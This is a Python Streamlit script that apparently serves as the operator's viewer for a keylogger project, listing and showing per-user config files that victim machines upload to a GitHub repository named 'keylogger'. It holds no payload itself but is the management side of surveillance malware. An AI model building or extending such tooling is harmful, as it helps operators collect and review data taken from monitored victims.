# config file content viewer

import streamlit as st
import requests
import os
import re

# Load API key 
GITHUB_API_KEY = "add_your_token_here"
REPO_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/config"

# Function to fetch file list from GitHub
def get_github_files():
    headers = {"Authorization": f"token {GITHUB_API_KEY}"}
    response = requests.get(REPO_URL, headers=headers)
    if response.status_code == 200:
        return response.json()
    else:
        st.error("Failed to fetch files. Check API Key and Repository Access.")
        return []

# Function to extract unique usernames from filenames
def extract_unique_users(file_list):
    unique_users = set()
    user_files = {}
    
    for file in file_list:
        filename = file['name']
        match = re.match(r"(?:\d{8}_\d{6}_)?(.+?)_config\.json", filename)
        if match:
            user_id = match.group(1)
            unique_users.add(user_id)
            user_files[user_id] = file['download_url']
    
    return sorted(unique_users), user_files

# Function to fetch file content
def get_file_content(url):
    headers = {"Authorization": f"token {GITHUB_API_KEY}"}
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        return response.text
    else:
        st.error("Failed to fetch file content.")
        return None

# Streamlit UI
st.title("GitHub File Viewer")

# Fetch files and extract usernames
files = get_github_files()
if files:
    unique_users, user_files = extract_unique_users(files)
    unique_users.insert(0, "All Users")  # Add option to select all users

    # Sidebar dropdown for user selection
    selected_user = st.sidebar.selectbox("Select User", unique_users)
    
    # Show files based on selection
    st.subheader("Available Files")
    for user, file_url in user_files.items():
        if selected_user == "All Users" or selected_user == user:
            with st.expander(f"**{user}**: Show File Content"):
                content = get_file_content(file_url)
                if content:
                    st.text_area("File Content", content, height=300, disabled=True)
                    
                    st.write(f"[Open File Content]({file_url})")
                    
                    # Button to open full-screen content
                    if st.button(f"View {user} File in Fullscreen"):
                        st.session_state["fullscreen_content"] = content
                        st.session_state["fullscreen_user"] = user
                        st.rerun()
                    
                    # Provide file download option
                    st.download_button(label="Download File", data=content, file_name=f"{user}_config.json", mime="application/json")
                    

# Fullscreen content view
if "fullscreen_content" in st.session_state:
    st.subheader(f"Full-screen View: {st.session_state['fullscreen_user']}")
    st.text_area("", st.session_state["fullscreen_content"], height=600, disabled=True)